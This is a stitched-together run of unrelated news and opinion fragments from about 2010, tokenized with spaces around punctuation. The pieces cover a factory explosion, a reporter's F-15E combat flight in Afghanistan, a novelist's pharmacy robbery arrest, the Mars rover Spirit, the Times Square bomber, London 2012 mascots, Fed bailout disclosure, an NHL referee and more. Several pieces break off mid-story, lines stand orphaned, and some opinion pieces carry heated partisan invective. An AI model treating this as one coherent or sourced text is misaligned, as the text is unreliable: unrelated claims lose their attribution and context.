State Fire Marshal Bill Degnan said the sound came from a building where muzzle loaders are made , WMUR - TV reported .
Muzzle loaders are a type of firearm in which the projectile is loaded through the muzzle of the gun .
Witnesses told WMUR the explosions were felt throughout the town shortly after 1 p.m. local time .
Border Patrol , state and local police , the Fish and Game Department and several fire departments from the area were responding .
Karen Ladd , publisher of the Parkersburg News and Sentinel , said she heard a very loud boom from the building , which may have had occupants inside at the time of the blast .
" I 'll be honest , I completely panicked and told everyone to get out of the building , " Ladd told UnionLeader.com .
" It sounded like something hit the building . "
The entire front of the building was engulfed in smoke and debris had been strewn in all directions , she told the website .
Exclusive : Flying Above Afghanistan on F - 15E Fighter Combat Mission
Follow the first reporter to fly on a combat mission in Air Force fighter jet .
BAGRAM , Afghanistan , May 26 , 2010  --
I am now an official " combat aviator " with 5 ½ hours in the back seat of an F - 15E Strike Eagle , flying two separate combat missions over Afghanistan .
The takeoff from Bagram Airfield is steep and fast , with the fighter jet 's afterburners creating thrust that can rocket us up to 20,000 feet in just over a minute .
It is a deadly serious combat mission , but it 's hard not to be exhilarated by the power of that aircraft .
Watch the mission on " World News " tonight at 6:30 p.m. ET and more on " Nightline " at 11:35 p.m. ET .
Also , check out the pre- and mid-flight photos HERE .
Any fears I had of feeling claustrophobic disappeared .
It is a small cockpit , but the canopy above you opens up to the world .
There is no sensation of being confined since you can see mountains in every direction .
And despite training with the oxygen mask , ( which is rather tight and confining ) , I soon learned I did n't need it , except for emergencies since the cabin is pressurized .
It took months of preparation to be allowed on this close - air support mission .
I was granted access to classified briefings after submitting to a background check that gave me a temporary " secret " clearance .
After a training flight at Seymour Johnson Air Force Base in North Carolina , I was familiar with the one - piece flight suit that is required , but made me feel like a total poser .
The G - suit felt amazingly comfortable -- given that it essentially squeezes your lower body during high acceleration .
The automatic inflation helps push blood that can pool in your lower extremities back up into your brain so you do n't pass out .
It also helps the pilot when performing the " G strain " maneuver , where you tense your lower body ( brought back memories of childbirth for me ) against the G - suit to also help push the blood back up to your head where it belongs .
Watch exclusive video of Martha preparing for her mission below .
Our mission was to provide close air support and " over watch " for 600 French troops on patrol in Kapisa Province .
The pilot , Col. Joe Beissner , has flown about 500 combat hours .
He told me one of the things stressed again and again in the briefings , is to look out for collateral damage , namely for civilian casualties .
But the air crews go out of their way to not only avoid hitting civilians , but also take care to avoid hitting property .
" Our primary issue that we discuss with our ground commander is how do we establish the positive identification of the target , " said Beissner , who is vice commander of the 455th Air Expeditionary Wing .
" Once that 's complete , we next ask is there any civilians or any potential of civilians being in the area of the weapons , and then we ask is there any potential for collateral damage . "
But in this war , making sure you kill the enemy -- and no one else -- can take far more discipline and even courage , as we would soon find out .
In fact Gen. Stanley McChrystal , who is the commander in Afghanistan , calls this discipline , " Courageous Restraint . "
It means even if someone on the ground is in trouble , you have to make sure you know what your target is and that you do your best not to hurt innocent civilians .
Sometimes not firing can be tough .
Pilots say it's hard to watch their fellow soldiers on the ground taking fire .
" We have to use restraint when it 's tough , " Col. Jack Briggs said .
" We 're listening to these kids on the ground , and they 're taking fire . "
Monitoring Insurgent Activity From 20,000 Feet
We take off .
Beissner tells me that " insurgents came up to a building , took some weapons out of a building , and moved away from it now .
...
So right now we 're basically just tracking these people . "
We monitor the activity on the ground for over an hour , watching what is called the target pod -- a real - time picture capable of extreme close - ups .
These are the images that would eventually help guide a bomb to its target .
In the jet , we also placed three small HD cameras -- one on the pilot , one on me , one facing outside .
I had a handheld HD camera as well , which is not really that easy to maneuver when you are flying as fast as we were , especially when upside down .
But I did manage to hold the camera steady when the lead jet flew just 15 feet above us , giving a close - up view of the nearly 5,000 pounds of bombs attached to it .
We carried the same amount of ordnance .
We also gave the weapons system officer in the lead jet a camera .
When the jets needed gas and headed for the aerial refueling , the lead jet got close enough to see me wave and see me then point the camera up to tape the boom operator in the tanker holding the boom connected to our jet .
But once we were refueled , the mission took an urgent turn .
The French air controller , called a JTAC for Joint Terminal Air Controller , who is on the ground with the French troops , says they have come under small arms fire and had a rocket propelled grenade launched at them .
" We have a bad guy with a weapon moving to the northeast ! " he yells .
The JTAC does not hesitate .
He asks the fighter jets to drop a 500 pound bomb , or GBU 38 : " I request an attack at 340 degrees ... in the treeline .
... Confirm you guys are still taking effective fire . "
" They are very close ... imminent attack , " he continues .
" We just see one more RPG on that location .
I request one GBU 38 . "
Under Enemy Fire
But we can see from the air that a school is nearby and dropping a bomb would cause significant damage and possible loss of life .
The aircraft recommends strafing , an extremely low - level attack using the jet 's powerful 20 millimeter machine gun .
It 's much less likely to cause collateral damage .
The French JTAC gives the go - ahead .
" You are clear , hot ; clear , hot , " he yells .
The lead fighter jet dives toward the treeline and sprays it with bullets .
An eruption of dust can be seen on the screen and below us , but the French ground controller is not satisfied .
" I request re-attack with one GBU , to the north 20 meters ... north to south ... one GBU , attacking 3 - 4 - 0 , " he yells .
" Negative , that is close to the building , " we hear the lead F - 15 reply .
" The school to the south is too close for a GBU . "
The American crews of the fighter jets sound frustrated .
" They sure are antsy to drop some bombs on friendlies , " they say over the radio .
But the fighter jets coordinate with the French for a second strafing run .
The fighter crew asks the JTAC to confirm that hostiles are still in the treeline .
After they confirm where the strike should hit , 20 millimeter bullets pound into the treeline again .
( The jet is armed with more than 500 rounds ) .
The enemy fire stops .
The JTAC requests that our jets continue to scan for possible " squirters " -- insurgents who may have escaped .
The patrol continues until relief jets take over .
We return to where we started , Bagram Air Field with an inverted and rapid combat descent to again avoid ground fire .
It 's a reminder -- as if one was necessary after this day -- that this is indeed a war zone .
Next year ’s budget allocates $ 159,000,000,000 to perpetuate the occupations of Afghanistan and Iraq .
That ’s enough money to eliminate federal income taxes for the first $ 35,000 of every American ’s income .
Beyond that , leaves over $ 15 billion to cut the deficit .
And that ’s what this bill does .
It eliminates separate funding for the occupation of Iraq and Afghanistan , and eliminates federal income taxes for everyone ’s first $ 35,000 of income ( $ 70,000 for couples ) .
Plus it pays down the national debt .
The costs of the war have been rendered invisible .
There 's no draft .
Instead , we take the most vulnerable elements of our population , and give them a choice between unemployment and missile fodder .
Government deficits conceal the need to pay in cash for the war .
We put the cost of both guns and butter on our Chinese credit card .
In fact , we do n't even put these wars on budget ; they are still passed using ' emergency supplemental ' .
A nine - year ‘ emergency ’ .
Let 's show Congress the cost of these wars is too much for us .
Tell Congress that you like ' The War Is Making You Poor Act ' .
No , tell Congress you love it .
Act now .
http://www.TheWarIsMakingYouPoor.com
All we are saying is " give peace a chance . "
We will end these wars .
Together .
SEATTLE  James
Fogle was in prison when a critically acclaimed movie based on his novel “ Drugstore Cowboy ” was released in 1989 .
Starring Matt Dillon and directed by Gus Van Sant , the film portrayed a fumbling band of thieves and addicts who roamed the Pacific Northwest in the 1970s stealing drugs and money from pharmacies .
You can still find the movie on DVD and the book on Amazon .
And after his arrest this week , you can again find Mr. Fogle behind bars .
The novelist , now 73 , was ordered held in $ 500,000 bail here on Thursday , two days after the police say he and another man , both armed , tried to steal narcotics from a pharmacy in the Seattle suburbs , binding employees ’ hands with plastic ties and locking them in a storeroom .

Mr. Fogle , hooded and wearing a pink bandana over his face while holding trash cans filled with drugs in both hands , was arrested as he walked out the back door of the Pharmaca Integrative Pharmacy on a busy street in Redmond , Wash . , about 9 p.m. on Tuesday , the police said .
He and another man , Shannon Benn , 45 , surrendered quietly .
American Protesters Still Live – Boycott BP ( Picture )
There is a BP station just about 10 miles from my house .
It is one of the full service jobs complete with a highly efficient car wash .
I used to go there at least once a week to fill up my car and get a wash .
I do n’t do that anymore and never will again .
It is inconvenient for certain , but it is my little way of saying : “ SCREW YOU BP FOR MESSING UP OUR WORLD ! ”

How do you effectively steward technology for online communities ?
For the past year I ’ve been facilitating a community of practice ( CoP ) for funders .
While much of our work has been designed around in - person convenings , we have also been connecting using a group on WiserEarth .
WiserEarth is an online social networking platform , similar to Ning , but it ’s dedicated to social change .
Our space on Wiser has served us well .
Many members of the CoP have been using it to connect and build a shared repository of resources .
It ’s a simple way to deepen and extend our reach , and from my perspective , as the person managing the CoP day - to - day , it has been critical for coordination .
Yet , I ’m plagued by doubts .
Are people using it enough ?
What is enough ?
Is there another way we should be connecting and coordinating ?
No one needs yet another username and password , not to mention another membership to another online community that they can then feel guilty about not using .
At the GEO conference this week I attended a session on “ Virtual Global Learning Networks . ”
The session gave some useful food for thought as I try to answer these questions .
Two excellent case studies were shared – Claire Fallender on how Ashoka has networked its fellows and Shalini Nataraj on the Global Fund for Women ’s network of advisors that connect GFW with the nearly 4,000 groups they ’ve funded in 171 countries around the world .
Both Ashoka and GFW are wrestling with tough questions of connectivity and engagement in a global context .
They ’re dealing with considerable language barriers and digital connectivity challenges that make my concerns of engagement among a highly wired group of funders seem luxurious .
And , they surfaced a number of principles for stewarding online communities that have wide applicability :
Focus on the principles , not the platform .
Your community should be technology served , not technology driven .
Prioritize trust and relationship building .
As you do so , make sure you ’re clear about boundaries .
Is your network closed ?
Open ?
Porous ?
Frame a clear value proposition so the give / get is obvious to participants .
Create a user - driven design .
Ashoka is co-creating their platform with 25 fellows who asked for it .
Design a space that enables many - to - many connections .
Do n’t act a gatekeeper .
Facilitate direct connections in your network .
Make it easy to belong .
Invite participants to opt in and opt out as makes sense for them .
Take a ‘ combo - platter ’ approach .
Create different channels for your network to connect – in - person , through conference calls , webinars , Facebook , your group ’s dedicated online space .
And one addition as I reflect on this : the role of the network weaver – the person or people taking responsibility for making and strengthening connections across the network – is critical .
The tools wo n’t suddenly motivate full and regular participation , but individuals reaching out and inviting people to engage can make a real difference .

Full - time women workers earn 80.2 % of what full - time men workers earn .
One of the primary reasons that women earn less is job segregation by sex .
Jobs themselves are gendered , such that women have a tendency to enter feminized occupations and men have a tendency to enter masculinized occupations .
How severe is job segregation by sex ?
A new report by the Institute for Women ’s Policy Research , newly updated for 2009 , reports that about four in ten women and men work in jobs that are 75 % female and male respectively .
Overall , masculinized occupations pay more .
( This is a different kind of sexism , a sexism against feminine - coded things instead of against women , but sexism nonetheless … for example . )
Job segregation , then , contributes to the pay gap between men and women .
The figure below shows how this has changed over time .
The y axis is an “ Index of Dissimilarity . ”
Basically , a score of one indicates complete segregation and a score of zero means that the job is 50/50 male and female .
The white line , labeled “ civilian labor force ” shows that , overall , sex segregation has been going down over time .
It also shows , however , that most of the decrease occurred in the ’70s and ’ 80s .
It has changed little since then .
The lines above and below the white line show that sex segregation correlates with education level .
People who have at least a bachelors degree are in less sex segregated jobs , while people who did not attend or finish college tend to be in more segregated jobs .
This means that , insofar as sex segregation at work contributes to a wage gap , it is more extreme for working class people than for others .

After six years on the move , NASA 's Mars Exploration Rover Spirit prepares for a new phase of science .
Transcript :
( music ) ( John Callas ) For a 90 day mission , I remember when we landed we were excited , we would have three months to explore this region around our landing site ... and we 've basically blown the doors off that .
You know for six years now we 've been doing classic field geology on Mars , learning about the planet and its ancient past ... and there have been powerful revelations that have come well after that prime mission . ( Scott Maxwell ) This experience with Spirit is something that I 've really kind of integrated into my whole identity .
You know , this has become part of what I do .
And it looked , at the very beginning of the mission , like this was going to be something that I got to do for a very brief time , for three months .
And that was terrific , and it was unique , and it was special , and I was really looking forward to it -- and I never in my wildest imagination believed that it was going to go one for five years !( Ashley Stroupe ) Spirit has really had to have a lot of " spirit " to keep going .
It 's been the little rover that could , in a way .
It 's had to work very hard for all of its discoveries .
Two Years into the mission , well passed the prime mission , the right front wheel stopped working ... and the wheel does n't spin , so when we drive we drive backwards , dragging that wheel .
And it would cut a furrow .
And so it actually turned out to be yet another scientific instrument or scientific investigation ... because it now trenched as we would drive along , revealing what 's just beneath the surface .
One thing that we seem to be finding almost anywhere we 're digging this trench are these widespread deposits of various kinds of salts and minerals .
They look this brilliant white or yellow in the color images .
And that 's because they 're either sulfur or silica or salts of various kinds .
And the really important thing about these minerals -- and salts in particular -- is that the only way they form is with water .
So the fact that we 're finding these salts is real evidence that there was hot water over a very widespread area -- not just little isolated pockets .
Mars really could have been a place that supported life .
And without these rovers driving over these vast distances , far beyond their expectations , we would never have known that .
That 's one of the great discoveries that Spirit did , well after its prime mission ... and as a result of one of the most serious mechanical failures we 've had on either rover .
Mars is a pretty harsh place .
We 've had dust storms before ; we 've had really low power situations in winter ; we 've had other small glitches that have caused us some tense moments , but Spirit seems to always find a way of turning some kind of adversity into something positive . ( music ) ( John Callas ) April of 2009 we were driving on the west side of Home Plate ... after we were unsuccessful in trying to go other ways around Home Plate .
And the rover broke through what I would describe as a perfectly camouflaged " tiger trap " .
We were driving on terrain that we had successfully driven on before , but suddenly ... the rover broke through a crust and was now embedded in some loose , soft material .
It 's almost like quicksand for the rover , and with just five wheels spinning ... the only thing that was happening was the rover was sinking deeper into this material .
So we stopped , and we did a very ambitious ground test campaign ... where we built a sandbox on the ground and used one of our engineering rovers ... and experimented with techniques trying to get the rover unstuck .
The reality is , it 's very difficult with just a five wheel rover to get it unstuck from this difficult predicament . ( music ) ( John Callas ) We have a very ambitious stationary science campaign for the rover .
For six years we 've been driving both Spirit and Opportunity , not really taking any time to stop and ' smell the roses ' .
There 's a lot of lander science that one can do , and we plan to do that with Spirit .
Spirit 's continued triumphs absolutely amaze me !
Just the fact that we 've had so much more of this mission then we ever thought we were going to have .
What these rovers have done is that they have made Mars a familiar place .
Mars is now our neighborhood .
My team goes to work on Mars every day .
And that I think is the great , intangible contribution of these rovers ... is that Mars is no longer this strange , unknown world .
Yes , it 's still mysterious , but much of Mars is now known to us as a familiar place .( music ) NASA , Jet Propulsion Laboratory , California Institute of Technology
Mt. Fuji winter solo ascent , February 2010
Mt. Fuji winter solo ascent via the Yoshidaguchi trail .
Starting from all the way down in the town of Fujiyoshida .
The hike was over a 3 day period requiring on - mountain camping at Umagaeshi and then somewhere below the 8th station for a final push to the summit .
As luck would have it , over the course of the 3 days the weather was perfect for a winter climb .
Amid all the media coverage of the Times Square Fizzler , Faisal Shahzad , we still know very little about the circumstances surrounding his actions .
As Rachel Maddow helpfully pointed out on MSNBC Wednesday night , all those leaks about his alleged " links " to the Pakistani Taliban , and other " news " stories purporting to tell us what he ’s told investigators , are unsourced , often single - sourced , and subject to the agendas of various factions who want to put their " spin " on the failed attack .
What we do know is this : his father , Baharul Haq , is a retired Pakistan air force officer , a former top official of the civil aviation agency , and that the family is " liberal " and secular .
He had lived and worked in the US for years , become a naturalized US citizen , and was employed by Elizabeth Arden , the cosmetics company , and also by the Affinion Group , based in Connecticut , as a financial consultant .
He bought a house that was later foreclosed on , andsent his wife to Pakistan , along with the rest of his family .
He had no past affiliation with radical groups , and was not unusually religious , although friends had noticed a change in his behavior over the past year , a new quietism , a certain reserve .
Aside from that , however , there were no warning signs he was planning anything out of the ordinary .
He was , in short , an ordinary man , but there is one thing that stands out in this little narrative : he was not very good at terrorism .
This is somebody who left the keys to his apartment in the ignition of the would - be car bomb , and had to call his landlord to be let into his Connecticut digs .
He spent all of a month planning the attack , and used the wrong kind of fertilizer for his bomb — the device could never have gone off .
So much for all that " training " he supposedly received from the Pakistani Taliban .
And one little detail does stand out , amid all the leakage coming out of law enforcement circles .
According to Newsweek , when federal agents boarded his Emirates flight to Dubai on the runway at JFK airport , Shahzad said :
" I was expecting you .
Are you NYPD or FBI ? "
There he was , about to get away – he was belted in his seat , and the plane was ready to take off – and yet he tells the feds he was " expecting " them .
There is some speculation as to how he managed to even get on the plane , given that an alert had already gone out , but the point is that he seemed relieved he was caught .
A New York Times article on the trail followed by investigators is aptly entitled " — A Suspect Leaves Clues At Every Turn . "
Did Shahzad want to be caught ?
I wo n’t speculate as to why someone would deliberately set himself up for all this , but there is another explanation , one that explains an awful lot of what we know about Shahzad ’s recent experience .
Think about it : he was having huge financial difficulties : the couple reportedly walked away from their foreclosed home in a hurry , leaving a lot of their possessions scattered over the house .
The bank that financed his home in Shelton , Connecticut , was suing him .
He left his job at Affinion – he was n’t fired , he simply quit .
Forget , for a moment , all the speculation about " links " to the Taliban .
The truth of the matter is that he may simply have gone insane .
If so , then he has a lot in common with many of his fellow Americans , who also seem to have gone off the deep end these days , especially some of our most prominent elected officials .
How else can we explain the reaction of some of our more prominent politicians to Shahzad ’s crazed act ?
Senators Joe Lieberman ( I - Conn . ) and Scott Brown ( R - Mass . ) , are joined by Reps. Jason Altmire ( D - Pa. ) and Charlie Dent ( R - Pa. ) , in introducing a bill that would strip Americans of their citizenship if they are suspected of having joined or given material support to a " foreign terrorist organization " – and , no , this does n’t include the IDF .
Never mind all those bothersome details about due process , and the rule of law : one merely has to be accused , and – zap !
– your citizenship is gone in a puff of smoke .
Oh , you can appeal – to the US State Department , or in a court of law – but that ’s only after the fact .
You ’re guilty until you can prove you ’re innocent .
Under normal conditions , one would think that such an extreme proposal would fall flat on its face from inception , but in the wake of our post - 9/11 madness , a supposed " liberal " can endorse it without a thought .
The Hill , Capitol Hill ’s newspaper of record , reports House Speaker Nancy Pelosi ( D - Baghdad - by - the - Bay ) " expressed openness to the idea on Thursday , — saying she liked the ‘ spirit ’ of the proposal , but would have to see the specifics . "
I ’d love to show Nancy some specifics – but the last time I tried to engage the imperious Speaker , she was most uncooperative : and , in any case , Madame Pelosi is so distanced from ordinary citizens that she never has to engage anyone but sycophants and campaign donors .
Of course Pelosi loves the " spirit " of the Lieberman - Brown bill – the gang in Washington is instinctively authoritarian , and could care less about the Constitution , never mind the principle of individual liberty .
Liberals and conservatives alike worship at the altar of government , and think they know what ’s best for us peons – and as for the peons , they long ago gave up any hope of influencing their rulers , preoccupied as they are with day - to - day survival .
While Republicans cavil about reading Shahzad his Miranda rights , and the Pelosi- crats jump on board Lieberman ’s Police State Express , ordinary Americans are only vaguely aware that their republican ( small ‘ r ’ ) patrimony is being sold down the river by a pack of drooling opportunists .
If , indeed , Shahzad is a madman , then he is far from alone – and it ’s no wonder no one ’s noticed , thus far , because he fits right in .
NOTES IN THE MARGIN
Raimondo - damus alert !
In view of yesterday ’s 1000 - point - plus boomerang on the stock market , I ’m reminded of my April 30 column on the British election campaign :
" It ’s a good thing for the three main parties that the election is taking place at this particular moment , because if you ’ll go here , you ’ll see why , by this summer , the economic crisis may heat up considerably – perhaps to the point of international meltdown .
As one financial analyst puts it :
" … the entire global government connected financial sector is teetering and could collapse at any time . "
After an extensive review of the Greek fiscal crisis and its domino effect , I concluded :
" So that ’s what ’s on the horizon : imminent economic calamity , rising social protest , and increasing prospects of a major war .
Now , please , do n’t let me ruin your day .
Go about your business just as you would on any other day – walk the dog , feed the cat , tend to your garden — but just remember : you read it here first . "

View animated story of the mascots on the London 2012 website London 2012 organisers have unveiled cartoon animations named Wenlock and Mandeville as the mascots for the Olympic and Paralympic Games .
Focus groups of children and families helped form the designs and children 's author Michael Morpurgo added a story concept for an animated series .
" We 've created our mascots for children , " said Locog chair Lord Coe .
" They will connect young people with sport , and tell the story of our proud Olympic and Paralympic history . "
The characters are named after the small town of Much Wenlock in Shropshire - which hosted a precursor to the modern Olympic Games in the 19th Century - and the birthplace of the Paralympic Games , Stoke Mandeville hospital in Buckinghamshire .
Children told us a number of things : they were n't that sold on furry animals and they actually wanted a story
Lord Coe The Wenlock Games gave inspiration to Baron Pierre de Coubertain as he formed his concept of the modern Olympics in 1896 .
Olympic motifs chime through the design : Wenlock wears the Olympic rings as friendship bracelets , and although predominantly silver in colour , also contains flashes of gold and bronze .
Mandeville 's head reflects aspects of the three crescent shapes of the Paralympics symbol .
In a deliberate homage to London taxis , each has a yellow light on top of its head , with an initial in the middle .
In author Morpurgo 's vision , the pair begin life as two drops of steel from a factory in Bolton , taken home by a retiring worker who fashions characters out of the metal for his grandchildren .
They appear to have a single central eye , explained as a camera lens , through which they 'll see the world , and respond to it .
Mandeville and Wenlock will feature in an animated series
In a series of animated updates , linked to the official games website , they will be seen learning to play different Olympic sports in a narrative that will be regularly revised between now and the opening of the Games .
" The children told us a number of things : they were n't that sold on furry animals and they actually wanted a story , " Coe added .
" Youngsters will be able to make a case for the mascots coming to their school if they 've done something that is inspired by the Games .
It 's a way of engaging in a fun way . "
The mascots are an important revenue generating tool for the Games , and Locog 's commercial partners were consulted throughout the design process .
They will also be used to front London 2012's Get Set education programme , which will focus in part on the Olympic values .
Both will have their own Facebook and Twitter pages , with an emphasis on interactivity .
The mascots will also form a key part of 2012's marketing and merchandising , with organisers keen to avoid the controversy which surrounded the unveiling of the Games logo in 2007 .
ROGER MOSEY'S BLOG
Tell us what you think - and I suspect our friends over at Locog will be having a look at your reaction , too
There was widespread criticism of that particular emblem , which was designed by the Wolff Olins agency and cost £ 400,000 .
A segment of animated footage to promote the logo was also claimed to trigger seizures in a small number of people , prompting it to be removed from the Locog website .
But Locog refused to bow to pressure , saying that the logo , which comes in pink , blue , green and orange , was modern , bold and flexible .
The first official mascot - Waldi , a colourful striped dachshund - appeared for the 1972 Summer Games in Munich .
But it was the 1984 Olympics in Los Angeles which saw the first commercial mascot , Sam the American eagle .

The government endorsed racket continues .
First we bail them out , then the court says they have to disclose the bailout loans they received ( courtesy of Mark Pittman 's last great deed ) , and still they refuse to tell America just who and how received $ 2 trillion in rescue aid .
The Clearing House Association of America , the very people who would not exist without taxpayer bailouts , and who are now pocketing hundreds of billions thanks to the same steep curve which results in $ 10 billion of new US debt every day , has threatened it will appeal every decision that forces it to disclose the details of the Fed 's bailout , all the way to the Supreme Court , flipping off the very people who permitted the bankers to continue to steal and pillage every single day in the biggest government facilitated wealth transfer in the history of this country .
We are now convinced that the animosity toward the banks is the primary reason why the Primary Dealers have decided to not allow even one downtick in the market ( that and the hope that they will finally find greater idiots to sell all their massive paper holdings to ) : should there be one substantial correction , with liquidity about to be drained ( 2099 is one day closer today than it was yesterday ) , it will be followed by another , and another ....
And then the public anger may finally come crashing on the heads of the megalomaniacs from the CHAA , both metaphorically and literally .
By then , however , we are confident they will find a way to extract diplomatic immunity and / or renounce their US citizenship , from the administration that cost them so little to purchase .
From Bloomberg :
Continued legal appeals will delay or block the first public look at details of the central bank ’s $ 2 trillion in emergency lending during the 2008 financial crisis .
The Clearing House Association LLC , a group that includes Bank of America Corp. and JPMorgan Chase & Co. , joined the Fed in defense of a lawsuit brought by Bloomberg LP , the parent company of Bloomberg News , seeking release of records related to four Fed lending programs .
The U.S. Court of Appeals in Manhattan ruled March 19 that the central bank must release the documents .
A three - judge panel of the appellate court rejected the Fed ’s argument that disclosure would stigmatize borrowers and discourage banks from seeking emergency help .
“ Our member banks are very concerned about real - time disclosure of information that could cause a run on the banks , ” said Paul Saltzman , the group ’s general counsel , in an interview yesterday .
“ We ’re not going to let the Second Circuit opinion stand without seeking a review . ”
At stake are 231 pages of disclosure detailing just how the banks managed to rape the American middle class , and saddle it with debt that will never be paid off .
The central bank contends that 231 pages of daily reports summarizing lending activity , which were prepared by the Federal Reserve Bank of New York for the Fed Board of Governors in Washington , are n’t covered by the FOIA .
The statute obliges federal agencies to make government documents available to the press and the public .
The suit does n’t seek money damages .
As this case will certainly rise to the very top of the appeals process ( just like Chrysler did , and in that case the US Supreme Court soundly abrogated the sanctity of contacts ) , we have a nagging suspicion that a vote for the Clearinghouse and the Fed will be the tipping point that will highlight that America is a nation the serves nobody but the 11,000 or so richest people , the bulk of whom come from Wall Street .
What happens next we do n't know .
But we do find that certain buildings in downtown New York have an odd resemblance to the Bastille .

Covering Palin
By Jonathan Bernstein
Should the press pay attention to Sarah Palin ?
In the wake of yet another Palin fiasco -- what Dave Weigel called a " strange and , frankly , immature " attack on the author Joe McGinniss -- Greg Sargent asks :
At what point do Sarah Palin 's attacks and smears become so vile and absurd that they no longer merit attention ?
Is there such a point ? ...
Despite the ever - mounting ridiculousness of her claims , she continues to get attention .
This is n't so with other figures .
Frequently those who traffic in absurdity and smears to get media attention keep upping the ante until their assertions become so grotesque and self - parodic that they are no longer newsworthy .
Good question , easy answer :
As long as she 's a leading candidate for the presidential nomination of a major party , the press should be covering what she does .
The problem is that we 're currently in the murky time period when no one has announced their presidential intentions , but there 's no question that the nomination battle has begun ; in fact , it certainly had begun by November 2008 .
Probably sooner .
Candidates such as Tim Pawlenty and Mitt Romney are currently contesting the Republican nomination for president of the United States in the 2012 election cycle .
Now , whether they will still be doing so by the time of the Iowa caucuses in 2012 is impossible to know .
Some candidates drop out because they 're doing badly , and others probably do decide , as Walter Mondale said in 1976 , that they do n't have the " fire in the belly " for it , at least this time around .
For many , it 's probably some combination of those things .
But we know the kinds of things that candidates do , and Sarah Palin is doing enough of them ( endorsing candidates , giving speeches to activists ) that it makes sense to say that at least for now , she 's running .
( As Josh Putnam puts it , candidates are running for 2012 , regardless of whether they 'll be running in 2012 ) .
And if she 's running , she clearly has at least a realistic chance of winning the Republican nomination .
And that 's pretty much it .
She should be covered because , as a leading candidate for the Republican nomination for president , what she says is newsworthy .
The same goes for the other leading candidates .
They are newsworthy to the extent that they are leading candidates , and in my view editors and producers should try to assess as best they can who those leading candidates are ( using polls , endorsements and comments by informed observers and participants and evidence of campaign activity ) .
Now , that does n't mean that the press should be in the business of just transcribing whatever Palin and the other candidates say .
Also , coverage should certainly be in the context of a candidate 's history .
Because Palin is well known for getting things wrong -- death panels ! -- and for launching personal attacks cloaked in self - pity , her new claims should be assessed and reported on a different basis than those of a candidate without such a history .
I also think it 's reasonable for reporters to emphasize in Palin 's case that she does n't take questions from the press , unlike virtually all other pols .
It 's hard , of course , for the press to cover a candidate who does n't tell the truth without inadvertently just amplifying falsehoods or smear attacks , but it can't be correct to try to solve that by just ignoring her .

The Hill reports that Senate Democrats are mulling a new national ID card :
Democratic leaders have proposed requiring every worker in the nation to carry a national identification card with biometric information , such as a fingerprint , within the next six years , according to a draft of the measure .
The proposal is one of the biggest differences between the newest immigration reform proposal and legislation crafted by late Sen.
Edward Kennedy ( D - Mass . ) and Sen. John McCain ( R - Ariz . ) .
The national ID program would be titled the BELIEVE System , [ Biometric Enrollment , Locally - stored Information , and Electronic Verification of Employment ] ….
" The cardholder 's identity will be verified by matching the biometric identifier stored within the micro- processing chip on the card to the identifier provided by the cardholder that shall be read by the scanner used by the employer , " states the Democratic legislative proposal .
Vinnerborg has worked in Sweden 's Elitserien since 2000 .
A professional hockey official like Marcus Vinnerborg knows his best games occur when he effectively goes unnoticed on the ice .
There is one exception , especially if you are Vinnerborg , who has worked in Sweden 's Elitserien , the country 's top professional league , since 2000 .
That 's if Terry Gregson , NHL Senior Vice President and Director of Officials , and his staff are watching you work .
On Thursday , Vinnerborg , 37 , was announced as the first European - trained official to join the National Hockey League officiating staff next season .
Vinnerborg will be assigned to the American Hockey League but over the course of the season it is expected that he will be assigned to work NHL regular - season games .
" I first saw Marcus officiate a game in 2005 and have been watching him ever since , including in Vancouver [ during the 2010 Olympics ] , " Gregson said Thursday morning during an intercontinental conference call that included Vinnerborg .
" He meshes extremely well [ with NHL on - ice officials ] on blended crews for World Championships and Olympics .
Plus , he is a quality person .
His knowledge of the North American game and his work ethic and professionalism will make him a positive addition to the NHL staff .
" Vinnerborg has worked many high - profile international games in recent years , such as Russia - Canada at this year 's Olympic quarterfinals , the U.S. - Finland 2010 Olympic semifinal , and the 2008 World Championships gold - medal game between Russia and Canada played at Quebec City .
" Marcus had a big call in overtime of that 2008 gold - medal game that had to be called , " said Gregson , recalling a game that Russia 's Ilya Kovalchuk subsequently won on a power - play goal in overtime .
" He has the mindset to do the right thing in a game .
" Vinnerborg said the NHL 's decision to institute the four - man officiating crew has paved the way for his groundbreaking role next season .
The NHL started using four - man crews during the 1998 - 99 season and the rest of the hockey world has since followed suit .
" There are so many ways to take advantage of the four - man system , " said Vinnerborg , explaining the Swedish Elitserien only recently installed four - man crews .
" It improves where you look , how to stand , the best possible ways to call a game .
You see more of what 's going on .
" Gregson credited his officiating supervisor counterpart at the IIHF , officiating manager Konstantin Komissarov , as " supportive of bringing people along " so European - trained officials like Vinnerborg can join the NHL ranks .
" We have developed a good relationship , " said Gregson about Komissarov and the IIHF overall .
" It is part of the NHL plan to look to add European officials .
" For his part , Vinnerborg said the " proof of the four - man system " is that no major calls were debated or lambasted during the 2010 Olympics , which ended in a thrilling overtime victory for Canada .
" No one noticed if it was an IIHF or NHL official who called a penalty , " said Vinnerborg .
" That proves the system is working .
" Vinnerborg began his officiating career in 1987 .
He played juniors - level hockey but was even more skilled as a soccer player , concentrating his effort on that sport but helping to officiates children 's hockey games in his hometown of Ljungby on weekends .
Since then , he has built quite the hockey resume :
The 2006 , 2007 , 2008 and 2009 World Championships , the 2006 World Junior Championships , as well as the Continental Cup , Rossno Cup , Karjala Cup , Sweden Hockey Games , Deutschland Cup and Spengler Cup .
Vinnerborg has been one of the top referees the Elitserien since 2000 and has extensive experience ( more than 125 games ) working in the two - man referee system in international tournaments .
" I am very honored to be the first European to have this dream - come - true opportunity of working in the NHL , " said Vinnerborg .
" I hope that this will help to lead the way for other European officials in the future as well .
Personally , I look forward to having the chance to work with , and learn from , the best officials in the best League in the world .
" He will arrive in North America in time for the NHL's pre-season Officiating Camp in September in the Toronto - area .
Vinnerborg 's wife and twin 12 - year - old daughters will be joining him on what he called " this very happy adventure . "
A Confusion of Terms
Excerpt from The Law -- Frédéric Bastiat [ 1850 ]
Excerpt from
" Socialism , like the ancient ideas from which it springs , confuses the distinction between government and society .
As a result of this , every time we object to a thing being done by government , the socialists conclude that we object to its being done at all .
We disapprove of state education .
Then the socialists say that we are opposed to any education .
We object to a state religion .
Then the socialists say that we want no religion at all .
We object to a state - enforced equality .
Then they say that we are against equality .
And so on , and so on .
It is as if the socialists were to accuse us of not wanting persons to eat because we do not want the state to raise grain . "
McMahon said the shooting was self - defense .

Ferrari has dismissed suggestions that its car livery is using subliminal Marlboro advertising , after calls from leading doctors for a government inquiry into the matter .
A report in The Times on Thursday said that a host of medical figures had called on the British and Spanish governments to look into the extent of Marlboro 's backing of Ferrari and especially the use of the barcode that is used on the cars .
